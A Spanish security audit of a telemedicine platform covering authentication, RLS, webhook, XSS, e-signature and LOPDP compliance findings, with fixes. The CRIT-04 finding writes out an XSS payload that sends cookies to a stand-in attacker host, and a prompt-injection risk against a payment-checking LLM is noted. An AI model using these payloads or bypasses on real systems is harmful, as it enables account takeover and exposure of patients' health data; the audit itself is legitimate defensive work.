# Auditoría de Seguridad — TeleDox/MEDILYFT
**Fecha:** 2026-07-03 · **Alcance:** repo completo (frontend `/public`, backend `/api`, bot WhatsApp `/src`, esquema/RLS `src/sql`, firma electrónica, secretos, cumplimiento LOPDP Ecuador)
**Metodología:** revisión de código estática por 7 subagentes especializados en paralelo (RLS/DB, frontend/XSS, `/api`, bot WhatsApp, firma electrónica/documentos, secretos/git history, mapeo de datos LOPDP), sin acceso de ejecución a la instancia real de Supabase.

> **No se implementó ningún fix.** Este documento es solo diagnóstico, para priorizar antes de decidir qué corregir.

---

## 1. Resumen ejecutivo — Top 5 riesgos

Casi todos los hallazgos críticos se explican por **tres causas raíz** que se repiten en cascada por todo el sistema. Arreglar estas tres cierra la mayoría de las rutas de explotación:

1. **La autenticación de aplicación en `/api` es falsificable.** Cinco endpoints (`admin-delete`, `atender-consulta`, `b2b-admin`, `responder-mensaje`, `seguimiento-decision`) deciden si el llamante es admin/médico **decodificando el JWT en base64 sin verificar su firma**. Cualquiera puede fabricar un token con el email de un admin/médico conocido y, como el backend usa la `service_role key` (bypassa RLS), obtener borrado de pacientes, reasignación de consultas, control de códigos B2B, respuestas médicas falsas y aprobación de seguimientos — sin contraseña, sin sesión real. [`api/admin-delete.js`, `api/atender-consulta.js`, `api/b2b-admin.js`, `api/responder-mensaje.js`, `api/seguimiento-decision.js`]

2. **RLS en Supabase es una sola política "todo o nada" para 33 tablas, y tres tablas clínicas quedaron completamente fuera.** `staff_autenticado_acceso_total FOR ALL TO authenticated USING (true)` no distingue médico/paciente/empresa — cualquier cuenta de staff (incluido rol `operador`) lee y edita todos los pacientes, consultas, recetas y el `.p12` de cualquier médico. Además, `mensajes_consulta`, `enlaces_teleconsulta` y `auditoria` probablemente nunca recibieron `ENABLE ROW LEVEL SECURITY`, por lo que quedan legibles/escribibles con la key pública del navegador, sin login de ningún tipo. [`src/sql/migracion_rls_basico.sql`, `src/sql/migracion_mensajes_consulta.sql`, `src/sql/migracion_enlaces_teleconsulta.sql`, `src/sql/tablas.sql`]

3. **El webhook de WhatsApp acepta mensajes sin verificar que vengan de Meta**, y la identidad del "paciente" se basa 100% en el campo `from` que ese webhook reenvía sin cuestionar. Esto habilita: suplantar a cualquier paciente, confirmar pagos falsos con el bypass de pruebas `__TEST__` (que vive en el código de producción sin gate de entorno), y — el hallazgo de mayor sensibilidad para datos de salud — **revelar diagnóstico y tratamiento clínico completos con solo escribir "hola" desde el número de teléfono registrado**, sin pedir ningún segundo factor. Combinado con que las cédulas ecuatorianas fueron parte de la filtración pública de 2019, un atacante que solo conoce la cédula de alguien puede además secuestrar su número de contacto registrado. [`api/webhook.js`, `src/flows/flujo-b2c.js`, `src/flows/flujo-consulta.js`]

Adicionalmente:

4. **Stored XSS cross-role de alto impacto**: un paciente puede poner un payload en su nombre o en la descripción de síntomas (vía el propio bot, sin pasar por ningún filtro) que se ejecuta en la sesión del médico/admin que abra el dashboard — y como Supabase guarda el JWT de sesión en `localStorage`, esto permite robar el token y tomar control completo de la cuenta médica. [`public/js/pacientes.js`, `consultas.js`, `dashboard.js`, `receta.js`, `cronicas-portal.js`]

5. **El sistema de firma electrónica no tiene autenticación y no es a prueba de alteración**: `api/firma-electronica.js` permite, sin login, sobrescribir el certificado `.p12` de cualquier médico y fabricar registros falsos de "firma certificada ECI acreditada" que se muestran públicamente en `verificar.html`. Además, no existe ningún mecanismo que impida editar el diagnóstico/medicamentos de una consulta **después** de que el documento ya fue firmado y enviado — el PDF se regenera y sobrescribe en el mismo `storage_path` sin versión ni hash de referencia. Esto compromete el valor médico-legal de recetas y certificados.

**Sobre LOPDP**: no existe política de privacidad ni términos de uso publicados en ningún punto del producto (pese a que el landing afirma explícitamente garantías de confidencialidad y consentimiento). El consentimiento explícito de tratamiento de datos de salud solo existe en un flujo (paciente B2B ya registrado) y está ausente en B2C, call center, crónicas, tracking y psicosocial. No hay mecanismo de autoservicio para derechos ARCO+, ni evidencia de DPO o registro ante la SPDP.

---

## 2. Hallazgos de seguridad

### CRITICAL

#### CRIT-01 — Verificación de JWT sin comprobar firma → suplantación total de admin/médico
- **Archivos:** `api/admin-delete.js:30-64`, `api/atender-consulta.js:15-37`, `api/b2b-admin.js:10-30`, `api/responder-mensaje.js:7-27`, `api/seguimiento-decision.js:15-37`
- **Escenario:** `decodeJWT()` solo hace `JSON.parse(Buffer.from(base64,'base64'))` del payload — nunca llama a `auth.getUser()` ni valida la firma. Un atacante fabrica `header.payload.firma-cualquiera` con `{"email":"admin@..."}` (email de admin/médico conocido) y lo manda como `token` en el body. El endpoint, corriendo con `service_role key`, ejecuta la acción sin más control: borrado de pacientes/consultas, reasignación de consultas, cambio del código de acceso B2B, respuestas médicas o aprobaciones de seguimiento falsas.
- **Contraste positivo:** `api/cron.js:36-41` sí valida correctamente contra `GET /auth/v1/user` — el patrón correcto ya existe en el repo, solo no se aplicó en los otros 5 archivos.
- **Fix:** reemplazar `decodeJWT` por el patrón de `cron.js` (`GET {SUPABASE_URL}/auth/v1/user` con el JWT como Bearer) en los 5 endpoints, y **además** verificar el rol contra la tabla `usuarios` después de confirmar la identidad.

#### CRIT-02 — RLS "todo o nada": ningún médico está aislado de otro, ninguna empresa B2B de otra
- **Archivo:** `src/sql/migracion_rls_basico.sql:87-90` — política única en 33 tablas: `CREATE POLICY "staff_autenticado_acceso_total" ... FOR ALL TO authenticated USING (true) WITH CHECK (true)`.
- **Escenario:** un médico A autenticado puede `PATCH /rest/v1/consultas?id=eq.<consulta-de-medico-B>` y modificarla. Un usuario `rol='operador'` puede leer/borrar cualquier fila de `pacientes`, `recetas`, `documentos_datos` igual que un `admin`. El control de rol que existe hoy es solo un `if` en JS (`public/js/pacientes.js:311`, `usuarios.js:123,138`, `consultas.js:196`) — trivialmente evadible desde la consola del navegador porque Postgres no lo exige.
- El propio equipo documentó esto como pendiente: `migracion_rls_basico.sql:122-131` ("Tier 2... ¿Un médico ve todos los pacientes o solo los de sus propias consultas?").
- **Fix:** diseñar e implementar Tier 2 — políticas con `auth.uid() = medico_id` en `consultas`/`recetas`, aislamiento por `empresa_id` en `clientes_b2b`/`empleados_b2b`/`tracking_*`, y separación real de permisos por rol (`operador` vs `medico` vs `admin`) en vez del blanket `USING(true)`.

#### CRIT-03 — Tablas clínicas fuera del barrido de RLS, expuestas con la key pública
- **Archivos:** `src/sql/migracion_mensajes_consulta.sql` (nunca menciona RLS), `src/sql/migracion_enlaces_teleconsulta.sql:17` (`DISABLE ROW LEVEL SECURITY` explícito), `src/sql/tablas.sql:139-152` (`auditoria`, sin ningún `ENABLE/DISABLE` en el repo). Ninguna de las tres aparece en el array de 33 tablas de `migracion_rls_basico.sql`.
- **Escenario:** con la key `sb_publishable_...` (expuesta en `public/js/config.js:2`, visible con "Ver código fuente" por cualquiera), un atacante sin login puede hacer `GET .../rest/v1/mensajes_consulta?select=*` y `GET .../rest/v1/enlaces_teleconsulta?select=*` y leer el contenido clínico completo (preguntas del paciente al médico, enlaces de videollamada). `auditoria` (el propio mecanismo de trazabilidad LOPDP) también podría ser legible o alterable, lo que socavaría la evidencia de auditoría misma.
- **Fix:** agregar estas 3 tablas a la migración de RLS (o una nueva) con `ENABLE ROW LEVEL SECURITY` + política equivalente a las demás; confirmar en producción con el SQL de la sección 3.

#### CRIT-04 — Stored XSS cross-role (paciente/operador → médico/admin) con robo de sesión vía `localStorage`
- **Archivos:** `public/js/pacientes.js:11-25,39-45,60`, `public/js/consultas.js:97-106`, `public/js/dashboard.js:80-82,150-162`, `public/js/receta.js:232-252,1937-1968`, `public/js/agendamiento.js:8,18-21`, `public/js/cronicas-portal.js:100-119`, `public/js/notificaciones.js:15,32`
- **Escenario:** un paciente registra su nombre o describe sus síntomas (vía bot o `guardarDatosPaciente()`) con un payload tipo `<img src=x onerror="fetch('https://atacante.test/?c='+document.cookie)">`. Al abrir el Dashboard, la lista de Consultas, la ficha del paciente, el chat de preguntas post-consulta (`mensajes_consulta.contenido`) o el registro de crónicas, el payload se ejecuta en la sesión del médico/operador/admin. Como el SDK de Supabase persiste el JWT en `localStorage` sin protección adicional, el script puede robar el `access_token` y suplantar completamente la cuenta médica. También existe una variante vía rotura de un `<textarea>` en el modal "Copiar info" (`public/js/utils.js:167-187`) y otra vía "notas" de un operador que termina en notificaciones vistas por un médico/admin (`public/js/agendamiento.js` + `notificaciones.js`).
- **Fix:** centralizar un `escapeHtml()` en `utils.js` y aplicarlo a **todo** dato de BD antes de insertarlo en `innerHTML`/template literals (nombre, apellidos, cédula, teléfono, correo, residencia, síntomas, notas, mensajes de chat). No construir `<textarea>`/nodos vía interpolación de string; usar `document.createElement` + `.value`/`.textContent`.

#### CRIT-05 — Contraseñas en texto plano en `usuarios.password_hash`, expuestas en `select=*`
- **Archivo:** `public/js/usuarios.js:137-151` (`adminCambiarPassword`), `usuarios.js:6,52,124` (`select=*`)
- **Escenario:** el cambio de contraseña desde el panel escribe la contraseña **en texto plano** directo en la columna `password_hash` (no cambia la contraseña real de Supabase Auth, que vive en `auth.users` — es además un bug funcional). Esa columna se incluye en un `select=*` que cualquier sesión admin recibe al cargar la lista de usuarios. Combinado con CRIT-04 (XSS que roba el token de un admin), un atacante puede exfiltrar contraseñas en claro de todo el staff médico.
- **Fix:** eliminar esta ruta cliente-directa; mover el cambio de contraseña a un endpoint backend con `service_role` que invoque `auth.admin.updateUserById`; excluir `password_hash` de cualquier `select` expuesto al navegador, o eliminar la columna si es vestigial.

#### CRIT-06 — Firma del webhook de WhatsApp evadible por omisión de header + secreto no configurado
- **Archivo:** `api/webhook.js:83-93`
- **Escenario:** `if (sigHeader && sigHeader !== expected) return 401` — si el atacante simplemente **no envía** `X-Hub-Signature-256`, la condición es falsa y la petición se procesa como legítima. Además, `WHATSAPP_APP_SECRET` no está definido en `.env.local` ni documentado en `src/.env.example`, por lo que hoy el bloque completo de verificación probablemente ni se ejecuta (`if (appSecret)` es `false`). Cualquiera puede `POST /api/webhook` simulando un mensaje de cualquier paciente real, controlando todo el flujo conversacional (cuestionarios, confirmación de pagos/toma de medicamento, alertas de crisis suicida falsas).
- **Fix:** invertir la lógica a fail-closed (`if (!sigHeader || sigHeader !== expected) return 401`), hacer `WHATSAPP_APP_SECRET` obligatorio (fallar el arranque si falta), usar `crypto.timingSafeEqual`.

#### CRIT-07 — Bypass de verificación de pago (`__TEST__`) vive en código de producción sin gate de entorno
- **Archivo:** `src/flows/flujo-b2c.js:260-269`
- **Escenario:** si `media.id === '__TEST__'` el flujo confirma el pago sin transferencia real. No hay ningún `if (process.env.NODE_ENV === 'test')` que lo confine. Combinado con CRIT-06 (webhook forgeable), cualquiera puede obtener una teleconsulta "pagada" gratis para cualquier cédula/nombre con solo un POST directo.
- **Fix:** eliminar el bypass del código de producción o envolverlo estrictamente en un flag de entorno inalcanzable en despliegue real; mover a inyección de dependencias como ya se hace en `scripts/test-bot/server.js`.

#### CRIT-08 — PII completa revelada solo con la cédula; secuestro del teléfono registrado del paciente
- **Archivo:** `src/flows/flujo-consulta.js:52-91,290-355`, `src/services/pacientes.js:3-6`
- **Escenario:** escribir "hola" + una cédula devuelve de inmediato nombre completo, edad, sexo, fecha de nacimiento, correo, teléfono, residencia y afiliación de empresa/seguro — sin pedir ningún dato adicional de posesión. Las cédulas ecuatorianas fueron parte de la filtración masiva de 2019 y no son secretas. Peor: eligiendo "usar este número" el bot ejecuta `actualizar(cedula, {telefono: numero_del_atacante})` (`flujo-consulta.js:345-355`), **sobrescribiendo el teléfono real del paciente** — secuestro persistente de cuenta, ya que todos los recordatorios/tracking se rutean por ese campo.
- **Fix:** exigir un segundo factor de posesión (fecha de nacimiento, o código enviado al teléfono *ya registrado*, no al que escribe) antes de mostrar PII o de aceptar un cambio de contacto.

#### CRIT-09 — Modo Call Center sin atar código de acceso a un teléfono de agente autorizado; fuga de PII entre empresas
- **Archivo:** `src/flows/flujo-consulta.js:36-50`, `src/flows/flujo-callcenter.js:12-53`
- **Escenario:** cualquiera que escriba un `clientes_b2b.codigo_acceso` válido (sin límite de intentos, sin vínculo a un teléfono autorizado) entra en modo call center. Dentro de ese modo, `buscarPorCedula()` consulta la tabla global `pacientes` **sin filtrar por `empresa_id`** — un "agente" de la Empresa A puede extraer PII de pacientes de la Empresa B o de B2C, y crear consultas/planillaje fraudulento a nombre de cualquier cédula.
- **Fix:** requerir un allowlist `agentes_callcenter(telefono, empresa_id)` y validar el remitente real contra esa lista; filtrar `buscarPorCedula` por `empresa_id` del código usado dentro de este flujo.

#### CRIT-10 — `api/firma-electronica.js` sin autenticación: IDOR sobre certificados `.p12` y registros de firma falsificables
- **Archivo:** `api/firma-electronica.js` completo (handler líneas 11-25; `guardarP12` líneas 56-80; `registrarFirma` líneas 82-110; `actualizarTSA` líneas 153-177)
- **Escenario:** ninguna operación valida sesión. `guardarP12` acepta `usuario_id` del body sin verificarlo contra el llamante y sobrescribe el `.p12` de **cualquier** médico. `registrarFirma` acepta `eci_acreditada`/`cert_emisor`/`titular` directamente del cliente e inserta en `documentos_firmados` — la tabla que alimenta la página pública `verificar.html`. Un atacante puede fabricar un registro de "firma electrónica certificada ECI acreditada por ARCOTEL" completamente falso para cualquier `usuario_id` conocido, sin que exista PDF ni certificado real detrás, rompiendo el modelo de confianza del sistema de verificación pública de documentos médico-legales.
- **Fix:** exigir JWT válido (una vez corregido CRIT-01) y que `usuario_id` coincida con la sesión; derivar `cert_emisor`/`eci_acreditada` server-side desde el hash de la firma PKCS#7 real, nunca de booleanos enviados por el cliente.

#### CRIT-11 — Ausencia de bloqueo post-firma: documentos médico-legales editables y regenerables sin versión/hash
- **Archivos:** `public/js/receta.js:1242-1264`, `public/js/documentos.js:148-168` (`upsertDocumentoStorage` con `x-upsert:true` sobre el mismo `storage_path`), `src/sql/tablas.sql:15-23` (tabla `documentos` sin columna de estado/hash)
- **Escenario:** no existe columna "firmado/bloqueado" ni hash de referencia. Un médico (o cuenta comprometida) puede editar `recetas.medicamentos`/`consultas.diagnostico` después de firmado, regenerar el PDF con contenido distinto, volver a firmarlo, y subirlo al **mismo** `storage_path`, sobrescribiendo toda evidencia del documento originalmente entregado al paciente.
- **Fix:** columna `firmado_en`/`bloqueado` que impida `UPDATE` de campos clínicos vía política RLS `WITH CHECK` una vez que exista un `documentos_firmados` asociado; versionar el `storage_path` (sufijo timestamp/hash) en vez de sobrescribir; guardar SHA-256 del PDF firmado en `documentos_firmados`.

#### CRIT-12 — Clave privada `.p12` de cualquier médico accesible por cualquier usuario autenticado
- **Archivos:** `src/sql/migracion_usuarios_firma_p12.sql:8`, política blanket de `migracion_rls_basico.sql` aplicada a `usuarios`
- **Escenario:** un operador/admin con sesión válida puede `GET /rest/v1/usuarios?select=firma_p12,firma_p12_info` y descargar el `.p12` (cifrado) de cualquier médico. Si la contraseña es débil/reutilizada/filtrada, puede firmar documentos médico-legales suplantando a ese médico.
- **Fix:** mover `firma_p12`/`firma_p12_info` a tabla separada con `USING (auth.uid() = usuario_id)`, o servirla solo vía backend que valide el JWT contra `usuario_id`.

---

### HIGH

| # | Hallazgo | Archivo | Escenario resumido |
|---|---|---|---|
| H1 | Escape incompleto de comillas en `onclick="...('...')"` (solo escapa `'`, no `"`) | `public/js/pacientes.js:22,44`, `empresas.js:24-32`, `receta.js:1885,1926` | Un apellido con `x" onmouseover="fetch(...)` rompe el atributo e inyecta un handler de evento activo con solo pasar el mouse. |
| H2 | `verificar.html` (público, sin login) renderiza campos del certificado sin escapar | `public/verificar.html:54-73` | Un médico que sube un `.p12` con CN manipulado (`<script>...`) puede ejecutar JS en la página pública que ve cualquiera que escanee el QR del documento. |
| H3 | Falta de scoping de ownership en `/api`: cualquier médico actúa sobre cualquier consulta/paciente | `api/atender-consulta.js:99-135`, `responder-mensaje.js:41-77`, `seguimiento-decision.js:50-100` | Un médico puede responder preguntas de pacientes de otro médico o aprobar seguimientos ajenos — confirmar si es diseño intencional de "cola compartida". |
| H4 | `api/cron.js` rama de prueba valida JWT pero no rol | `api/cron.js:34-51,88-91` | Cualquier usuario con sesión válida (no solo médico/admin) puede disparar el envío real de un recordatorio de WhatsApp. |
| H5 | Diagnóstico/tratamiento revelado solo por posesión del teléfono en tracking crónico | `api/webhook.js:187-230,293-320` | Escribir "hola" desde el teléfono registrado muestra `diagnostico`/`tratamiento` sin pedir cédula ni ningún dato adicional — un familiar con acceso al celular, o un número reciclado, ve datos de salud sensibles. |
| H6 | Ausencia total de OTP/segundo factor en todo el bot | Todo `src/flows/*` | No existe ningún código de un solo uso en el sistema; toda "verificación" se reduce a conocer una cédula o escribir desde un número ya registrado. |
| H7 | `telefono` sin `encodeURIComponent`/normalización antes de usarse en filtros PostgREST | `src/services/seguimiento.js:4-27` | Si CRIT-06 no se corrige, `msg.from` es arbitrario y podría ampliar el filtro PostgREST (`&or=(...)`) exponiendo/alterando datos de otro paciente. |
| H8 | Secuestro de sesión de conversación activa por falta de atadura fuerte a identidad | `src/services/sesiones.js:3-19`, `api/webhook.js:364-375` | Sin CRIT-06 resuelto, un atacante puede inyectar respuestas en la sesión activa de una víctima real (pago, síntomas, emergencia). |
| H9 | Bucket de Storage de documentos siempre invocado con la anon key, nunca con el JWT de sesión; políticas no versionadas en el repo | `public/js/documentos.js:77-83,126-132,148-168` | Si las políticas de `storage.objects` permiten operaciones a `anon` (aparentemente necesario para que este código funcione), cualquiera en internet podría generar signed URLs o subir/sobrescribir documentos de pacientes sin autenticarse. |
| H10 | `api/enviar-docs.js`/`enviar-link.js`/`enviar-seguimiento-lab.js` sin autenticación ni verificación de ownership | Archivos completos | Permiten reenviar documentos clínicos o enviar mensajes de phishing con marca oficial de WhatsApp a cualquier `paciente_id` conocido/adivinado. |

---

### MEDIUM

| # | Hallazgo | Archivo |
|---|---|---|
| M1 | Ausencia sistemática de `encodeURIComponent` en ~149 de 151 llamadas `supa(...)` con query string (patrón de riesgo, no explotado hoy porque los IDs son UUID de servidor) | `public/js/*.js` (excepto `auth.js:24`) |
| M2 | Escape ad-hoc inconsistente entre archivos (algunos sí escapan, la mayoría no) | `public/js/pacientes.js:237` vs. resto |
| M3 | Sin rate limiting/backoff visible en login (depende de configuración de Supabase Auth, a confirmar) | `public/js/auth.js` |
| M4 | Mensajes de error crudos (`e.message`) devueltos al cliente en casi todos los `catch` de `/api` | `api/admin-delete.js:199`, `firma-electronica.js` (varios), `webhook.js:854-875` |
| M5 | CORS `Access-Control-Allow-Origin: '*'` en endpoints admin/médico sensibles | `admin-delete.js:173`, `atender-consulta.js:87-88`, `b2b-admin.js:33-34`, `seguimiento-decision.js:40-41`, `enviar-link.js:53-54`, `firma-electronica.js:12-13` |
| M6 | Sin protección de plataforma (Vercel Deployment Protection/IP allowlist) para ninguna ruta `/api/*`; `src/vercel.json` huérfano con rutas `api/api/...` inexistentes | `vercel.json`, `src/vercel.json` |
| M7 | Aprobación de pago delega en salida de un LLM manipulable por imagen (prompt injection visual sobre el comprobante) | `src/services/gemini.js:6-24`, `src/flows/flujo-b2c.js:286-336` |
| M8 | Continuidad de 72h para preguntas post-consulta basada solo en `telefono` | `api/webhook.js:232-257`, `src/flows/flujo-pregunta-consulta.js:31-37` |
| M9 | Sin límite de intentos para cédula o código de call center | `src/flows/flujo-consulta.js:34-56`, `flujo-callcenter.js:29-36` |
| M10 | Certificados `.p12` de prueba (mock, autofirmados) commiteados en rama no mergeada `prototipo/firma-p12-pdf` | `scripts/prototipo-firma-p12/test-assets/*.p12` |
| M11 | Sin validación de MIME real (solo tamaño) en subida de documentos | `public/js/documentos.js:87-138` |
| M12 | Timestamp TSA (RFC 3161) best-effort, sin job de reintento/backfill | `public/js/firma-electronica.js:409-457` |

---

### LOW

- `api/compress.js` sin autenticación — riesgo de abuso de cómputo, no de datos (`api/compress.js:5-52`).
- Comparación de firma del webhook no es constant-time (`api/webhook.js:89`, usa `!==` en vez de `crypto.timingSafeEqual`).
- Credenciales Twilio (`TWILIO_SID/TOKEN/NUMBER`) obsoletas aún en `.env.local`, sin uso real (el canal activo es Meta WhatsApp Cloud API) — confirmar baja/rotación y eliminar.
- `sesiones.js` sin upsert atómico (lectura-luego-escritura) — riesgo de duplicados bajo alta concurrencia, no de confusión entre usuarios (`src/services/sesiones.js:11-19`).
- Logs de `bot_eventos.detalle` guardan hasta 200 caracteres de texto crudo del mensaje del paciente (que puede incluir síntomas/datos clínicos) junto al teléfono, sin redacción (`api/webhook.js:138`).
- `WHATSAPP_APP_SECRET` no centralizado en `src/config/index.js` (aumenta el riesgo de quedar fuera del checklist de despliegue).
- `.env.local` con secretos reales en disco — no está en git, pero asegurar buenas prácticas de manejo local/rotación si se sospecha exposición fuera de git.

### Confirmaciones positivas (no son hallazgos)
- La key expuesta en `public/js/config.js` es la `sb_publishable_...` (equivalente a `anon`), no `service_role` — correcto para uso en cliente.
- `SUPABASE_KEY` (service_role) solo se usa server-side vía `process.env`; no se encontró hardcodeada en ningún archivo.
- **No se encontró ningún secreto real comprometido en el historial de git** (429 commits revisados) — solo placeholders vacíos en `.env.example`.
- `api/admin-delete.js` usa whitelist explícita de campos editables (`CAMPOS_USUARIO_PERMITIDOS`) — buen patrón anti mass-assignment.
- `api/firma-electronica.js` (`verificarFirma`) excluye deliberadamente cédula/RUC de la respuesta pública del QR — buena minimización de datos.
- No se detectaron IDs secuenciales expuestos en el frontend (todo usa UUID de servidor).

---

## 3. Checklist de RLS por tabla

Ejecutar este SQL en el SQL Editor de Supabase (producción) y pegar el resultado para confirmar el estado real — el repo solo permite inferir intención, no el estado ejecutado:

```sql
-- (a) ¿Qué tablas tienen RLS habilitado/deshabilitado?
SELECT
  n.nspname AS schema, c.relname AS tabla,
  c.relrowsecurity AS rls_habilitado,
  c.relforcerowsecurity AS rls_forzado_para_owner,
  CASE WHEN c.relrowsecurity THEN '✅ RLS ON' ELSE '🔴 RLS OFF' END AS estado
FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace
WHERE n.nspname = 'public' AND c.relkind = 'r'
ORDER BY c.relrowsecurity ASC, c.relname;

-- (b) Todas las políticas activas por tabla
SELECT schemaname, tablename, policyname, roles, cmd AS comando,
       permissive, qual AS condicion_using, with_check AS condicion_with_check
FROM pg_policies WHERE schemaname = 'public'
ORDER BY tablename, policyname;

-- (c) Tablas sin ninguna política
SELECT c.relname AS tabla, c.relrowsecurity AS rls_on
FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace
WHERE n.nspname = 'public' AND c.relkind = 'r'
  AND NOT EXISTS (SELECT 1 FROM pg_policies p WHERE p.schemaname='public' AND p.tablename=c.relname);

-- (d) Foco: las tablas identificadas como gap en esta auditoría
SELECT relname, relrowsecurity FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
WHERE n.nspname='public' AND relname IN
  ('mensajes_consulta','enlaces_teleconsulta','auditoria','documentos_firmados',
   'seguimiento_laboratorio','seguimiento_laboratorio_respuestas');

-- (e) Funciones RPC invocables por anon/authenticated
SELECT p.proname AS funcion, p.prosecdef AS security_definer,
       pg_get_userbyid(p.proowner) AS owner,
       has_function_privilege('anon', p.oid,'EXECUTE') AS ejecutable_por_anon,
       has_function_privilege('authenticated', p.oid,'EXECUTE') AS ejecutable_por_authenticated
FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='public';
```

| Tabla | ¿En migración Tier 1 (2026-07-03)? | Veredicto |
|---|---|---|
| pacientes, consultas, usuarios, recetas, clientes_b2b, empleados_b2b, documentos, documentos_datos, antecedentes, enfermedades_cronicas, registros_cronicos, notificaciones, recordatorios, seguimiento_respuestas, sesiones_bot, metricas, verificaciones_comprobante, paciente_health_score, cierres_casos | Sí | RLS ON, pero política blanket sin aislamiento por médico/paciente/empresa (CRIT-02). Verificar con query (b). |
| documentos_firmados, seguimiento_laboratorio(_respuestas), tracking_empresas/casos/registros/biometricos/psicosocial, bot_mensajes_procesados/bot_eventos | Sí, pero su migración de creación las dejó con `DISABLE` explícito | Confirmar con query (a)/(d) que el `ENABLE` de Tier 1 corrió **después** y ganó — el repo no permite verificar el orden real de ejecución en producción. |
| **mensajes_consulta** | **No** | Gap crítico — agregar RLS ya (CRIT-03). |
| **enlaces_teleconsulta** | **No** (DISABLE explícito) | Gap crítico — agregar RLS ya (CRIT-03). |
| **auditoria** | **No** | Gap importante — agregar RLS ya (CRIT-03/CRIT-04 de la sección LOPDP). |
| facturacion_b2c, planillaje_b2b, seguimientos, cumplimiento_tratamiento | Sí (aparecen en el array) | Esquema no versionado en el repo (creadas directo en Supabase) — no se pudo revisar columnas/sensibilidad exacta. Confirmar manualmente. |
| `fn_auditoria()` (trigger, SECURITY DEFINER) | N/A | No expuesta como RPC en el código JS, pero confirmar con query (e) que no tenga `EXECUTE` otorgado a `anon`/`authenticated` por herencia de `PUBLIC`. |

**Tier 2 pendiente (ya identificado por el propio equipo en el código):** políticas con `auth.uid() = medico_id` en `consultas`/`recetas`; aislamiento por `empresa_id` en `clientes_b2b`/`empleados_b2b`/`tracking_*`; separación de permisos por rol (`operador` vs `medico` vs `admin`) en vez de `USING(true)` genérico.

---

## 4. Checklist de cumplimiento LOPDP (Ecuador)

| Requisito | Estado actual | Evidencia | Acción |
|---|---|---|---|
| Base legal / consentimiento explícito para datos de salud | **Parcial** — solo existe en el flujo de paciente B2B ya registrado | `src/flows/flujo-consulta.js:84-131` (pregunta sí/no de autorización) | Agregar el mismo paso a `flujo-b2c.js`, `flujo-callcenter.js`, `flujo-cronicas.js`, `flujo-tracking*.js`, `flujo-psicosocial.js` antes de recolectar cualquier dato. Validar redacción con abogado. |
| Política de privacidad / términos de uso | **Ausente** — no existe ningún archivo, ni enlace, en todo el repo | Búsqueda exhaustiva sin resultados; el landing (`public/landing/index.html:524,634`) afirma garantías de privacidad sin respaldo documental | Bloqueante: redactar y publicar antes de producción, con validación legal explícita para LOPDP Ecuador. |
| Anonimización real cuando se promete | **Falla** — la evaluación psicosocial se anuncia como "completamente anónima" pero es reidentificable vía `caso_id → tracking_casos` (que tiene nombre, teléfono, diagnóstico) | `src/flows/flujo-psicosocial.js:111`, `public/tracking/setup-psicosocial.sql:16`, `setup.sql:14-23` | Corregir el mensaje al usuario (no prometer anonimato que no existe) o rediseñar el almacenamiento para que sea real. |
| Derechos ARCO+ (acceso, rectificación, cancelación, oposición, portabilidad) | **No hay autoservicio** — solo existe borrado interno operado por admin (`api/admin-delete.js`), no un mecanismo para que el titular lo solicite | `api/admin-delete.js:134-169` | Definir un procedimiento (aunque sea manual/vía soporte) para que el paciente ejerza estos derechos, documentado y accesible. Validar con abogado si el manual es suficiente para el volumen de datos tratado. |
| Registro del banco de datos ante la SPDP | **Sin evidencia** — no se encontró mención en el repo | Búsqueda sin resultados | Requiere validación legal externa: confirmar si aplica y, de ser así, completar el registro antes de producción. |
| Delegado de Protección de Datos (DPD/DPO) | **Sin evidencia de designación** | Búsqueda sin resultados | Validación legal: dado que se tratan datos de salud (categoría especial) de forma sistemática, es probable que aplique la obligación — confirmar con abogado. |
| Procedimiento de notificación de brechas | **Ausente** | No se encontró ningún runbook/documento de respuesta a incidentes en el repo | Definir plazo y destinatarios de notificación (SPDP + titulares afectados) antes de producción; conectar con el hallazgo CRIT-03 (tablas expuestas hoy sin RLS podrían ya constituir una exposición a auditar). |
| Minimización de datos | **Parcial** — algunos campos parecen innecesarios | "Lugar de nacimiento" y "lugar de residencia" repetidos (`public/index.html:1125,1377`), captura de pantalla completa del comprobante de pago sin recorte (`flujo-b2c.js`) | Revisar formularios y reducir campos a los estrictamente necesarios para la teleconsulta. |
| Datos de menores de edad | **Sin consentimiento diferenciado visible** | `public/index.html:1135,1386` ("Persona Responsable (Menor de edad)") sin flujo de consentimiento específico encontrado | Diseñar consentimiento explícito del representante legal para pacientes menores; validar con abogado el estándar LOPDP para datos de NNA. |
| Retención y eliminación | **Documentada pero no activa** para logs técnicos; **sin política** para datos clínicos | `docs/observabilidad.md:76` y `db/observabilidad.sql:47-50` (`DELETE` de 30 días **comentado**, inactivo) | Activar la purga de logs técnicos; definir junto con normativa MSP de historia clínica (que puede exigir retención mínima distinta/mayor a la de LOPDP) un plazo de retención para datos clínicos, documentarlo, y decidir si se necesita distinguir "eliminación" de "anonimización" para cumplir ambas normas a la vez. Validar con abogado el cruce LOPDP/MSP. |
| Transferencia internacional de datos | **Confirmada, sin marco documentado** | Supabase (nube, `public/js/config.js:1-2`), Meta WhatsApp Cloud API (`src/services/whatsapp.js:4,128`), Google Gemini (`src/services/gemini.js:4`, imágenes de comprobantes de pago que pueden incluir datos bancarios), FreeTSA (timestamp de firma) | Validación legal: evaluar si estas transferencias requieren cláusulas contractuales/garantías bajo LOPDP, y documentar los encargados de tratamiento (DPA) con Supabase/Meta/Google. |
| Logs con posible PII/datos de salud en texto plano | **Confirmado** | `api/webhook.js:138` (`bot_eventos.detalle` guarda hasta 200 caracteres del texto del paciente) | Evaluar si es necesario redactar/excluir el cuerpo del mensaje del log cuando el flujo activo recolecta datos clínicos; cruzar con CRIT-03 (esa tabla también podría carecer de RLS). |

---

## 5. Plan de acción priorizado para salida a producción

### Bloqueante — no lanzar sin esto
1. **CRIT-01**: corregir verificación de JWT en los 5 endpoints de `/api` (usar el patrón ya correcto de `cron.js`).
2. **CRIT-06 + CRIT-07**: arreglar validación de firma del webhook de WhatsApp (fail-closed, secreto obligatorio) y eliminar/aislar el bypass `__TEST__` de pagos.
3. **CRIT-02 + CRIT-03**: cerrar el gap de RLS en `mensajes_consulta`, `enlaces_teleconsulta`, `auditoria`; diseñar e implementar el Tier 2 de aislamiento por médico/empresa (al menos para `consultas`, `recetas`, `pacientes`, `clientes_b2b`/`empleados_b2b`).
